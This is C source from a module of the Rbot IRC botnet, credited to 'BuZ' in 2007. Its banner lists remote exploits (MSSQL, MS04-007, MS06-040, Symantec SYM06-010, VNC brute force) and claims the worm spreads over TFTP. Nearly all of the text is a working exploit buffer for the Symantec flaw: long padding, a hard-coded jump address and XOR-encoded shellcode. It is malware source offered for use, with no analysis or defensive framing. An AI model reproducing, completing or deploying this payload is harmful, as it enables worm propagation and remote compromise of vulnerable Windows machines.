/* |  _ \ \ \/ /    / |___ \ / _ \ TesT |  \/  |/ _ \|  _ \    \ \   / /___ \ 
   | |_) | \  /_____| | __) | | | |_____| |\/| | | | | | | |____\ \ / /  __) |
   |  _ <  /  \_____| |/ __/| |_| |_____| |  | | |_| | |_| |_____\ V /  / __/ 
   |_| \_\/_/\_\ BuZ|_|_____|\___/      |_|  |_|\___/|____/  BuZ  \_/  |_____|
   ---------------------------------------------------------------------------
   --MSSQL-NTPASS-SYM06010-MS04007-MS06040-VNCBRUTE-PSTORE-FIREFOX-SP2PATCH---  
   ---------------------------------------------------------------------------
               Greets To: THE REAL CODERS & The Ryan1918 Crew !!
 */
//ported to Rbot by BuZ aka Test 2007
// Works and Spreading With TFTP
#include "..\Inc.h"
#include "..\Fun.h"
#include "..\Ext.h"

#ifndef NO_SYM 

char ShellCode[] =
"\x01\x10\x0F\x20\x0A\x00\x00\x00\x02\x18\x00\x01\x00\x00\x00\x00"
"\x00\x24\x00\x14\xB7\xC9\xD2\xD9\x3E\x33\xEF\x34\x25\x1F\x43\x00"
"\x02\x02\x5C\x2F\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
"\x61\x61\x61\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62"
"\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62"
"\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62"
"\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62"
"\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62"
"\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62"
"\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62"
"\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62"
"\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62"
"\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62"
"\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62"
"\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62"
"\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62"
"\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62"
"\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62"
"\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62\x62"
"\x62\x62\x62\x62\x01\x01\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22"
"\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22"
"\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22"
"\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22"
"\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22"
"\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22"
"\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22"
"\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22"
"\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22"
"\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22"
"\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22"
"\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22"
"\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22"
"\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22"
"\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22"
"\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22"
"\x22\x22\x22\x22\x22\x22\x22\x01\x01\x64\x64\x64\x64\x64\x64\x64"
"\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64"
"\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64"
"\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64"
"\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64"
"\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64"
"\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64"
"\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64"
"\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64"
"\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64"
"\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64"
"\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64"
"\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64"
"\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64"
"\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64"
"\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64"
"\x64\x64\x64\x64\x64\x64\x64\x64\x64\x64\x01\x01\x65\x65\x65\x65"
"\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65"
"\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65"
"\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65"
"\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65"
"\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65"
"\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65"
"\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65"
"\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65"
"\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65"
"\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65"
"\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65"
"\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65"
"\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65"
"\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65"
"\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65"
"\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x65\x01\x01\x66"
"\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66"
"\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66"
"\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66"
"\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66"
"\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66"
"\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66"
"\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66"
"\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66"
"\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66"
"\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66"
"\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66"
"\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66"
"\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66"
"\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66"
"\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66"
"\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66\x66"
"\x01\x01\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67"
"\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67"
"\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67"
"\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67"
"\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67"
"\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67"
"\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67"
"\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67"
"\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67"
"\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67"
"\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67"
"\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67"
"\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67"
"\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67"
"\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67"
"\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67\x67"
"\x67\x67\x67\x01\x01\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68"
"\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68"
"\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68"
"\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68"
"\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68"
"\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68"
"\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68"
"\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68"
"\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68"
"\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68"
"\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68"
"\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68"
"\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68"
"\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68"
"\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68"
"\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68"
"\x68\x68\x68\x68\x68\x68\x01\x01\x69\x69\x69\x69\x69\x69\x69\x69"
"\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69"
"\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69"
"\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69"
"\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69"
"\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69"
"\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69"
"\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69"
"\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69"
"\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69"
"\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69"
"\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69"
"\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69"
"\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69"
"\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69"
"\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69"
"\x69\x69\x69\x69\x69\x69\x69\x69\x69\x01\x01\x6A\x6A\x6A\x6A\x6A"
"\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A"
"\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A"
"\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A"
"\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A"
"\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A"
"\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A"
"\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A"
"\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A"
"\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A"
"\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A"
"\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A"
"\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A"
"\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A"
"\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A"
"\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A"
"\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x01\x01\x6B\x6B"
"\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B"
"\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B"
"\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B"
"\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B"
"\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B"
"\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B"
"\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B"
"\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B"
"\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B"
"\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B"
"\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B"
"\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B"
"\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B"
"\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B"
"\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B"
"\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x6B\x01"
"\x01\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C"
"\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C"
"\x6C\x6C\x6C\x6C\x6C\x6C\x41\x41\xEB\x06\x0D\x10\x1E\x50\x6D\x6D"// JMP Address \x501e100d -> 0D 10 1E 50(For WinAll)
"\x33\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xc8"
"\xd9\x7f\x87\x83\xeb\xfc\xe2\xf4\x34\xb3\x94\xca\x20\x20\x80\x78"
"\x37\xb9\xf4\xeb\xec\xfd\xf4\xc2\xf4\x52\x03\x82\xb0\xd8\x90\x0c"
"\x87\xc1\xf4\xd8\xe8\xd8\x94\xce\x43\xed\xf4\x86\x26\xe8\xbf\x1e"
"\x64\x5d\xbf\xf3\xcf\x18\xb5\x8a\xc9\x1b\x94\x73\xf3\x8d\x5b\xaf"
"\xbd\x3c\xf4\xd8\xec\xd8\x94\xe1\x43\xd5\x34\x0c\x97\xc5\x7e\x6c"
"\xcb\xf5\xf4\x0e\xa4\xfd\x63\xe6\x0b\xe8\xa4\xe3\x43\x9a\x4f\x0c"
"\x88\xd5\xf4\xf7\xd4\x74\xf4\xc7\xc0\x87\x17\x09\x86\xd7\x93\xd7"
"\x37\x0f\x19\xd4\xae\xb1\x4c\xb5\xa0\xae\x0c\xb5\x97\x8d\x80\x57"
"\xa0\x12\x92\x7b\xf3\x89\x80\x51\x97\x50\x9a\xe1\x49\x34\x77\x85"
"\x9d\xb3\x7d\x78\x18\xb1\xa6\x8e\x3d\x74\x28\x78\x1e\x8a\x2c\xd4"
"\x9b\x8a\x3c\xd4\x8b\x8a\x80\x57\xae\xb1\x5e\xec\xae\x8a\xf6\x66"
"\x5d\xb1\xdb\x9d\xb8\x1e\x28\x78\x1e\xb3\x6f\xd6\x9d\x26\xaf\xef"
"\x6c\x74\x51\x6e\x9f\x26\xa9\xd4\x9d\x26\xaf\xef\x2d\x90\xf9\xce"
"\x9f\x26\xa9\xd7\x9c\x8d\x2a\x78\x18\x4a\x17\x60\xb1\x1f\x06\xd0"
"\x37\x0f\x2a\x78\x18\xbf\x15\xe3\xae\xb1\x1c\xea\x41\x3c\x15\xd7"
"\x91\xf0\xb3\x0e\x2f\xb3\x3b\x0e\x2a\xe8\xbf\x74\x62\x27\x3d\xaa"
"\x36\x9b\x53\x14\x45\xa3\x47\x2c\x63\x72\x17\xf5\x36\x6a\x69\x78"
"\xbd\x9d\x80\x51\x93\x8e\x2d\xd6\x99\x88\x15\x86\x99\x88\x2a\xd6"
"\x37\x09\x17\x2a\x11\xdc\xb1\xd4\x37\x0f\x15\x78\x37\xee\x80\x57"
"\x43\x8e\x83\x04\x0c\xbd\x80\x51\x9a\x26\xaf\xef\x38\x53\x7b\xd8"
"\x9b\x26\xa9\x78\x18\xd9\x7f\x87\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
"\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D\x6D"
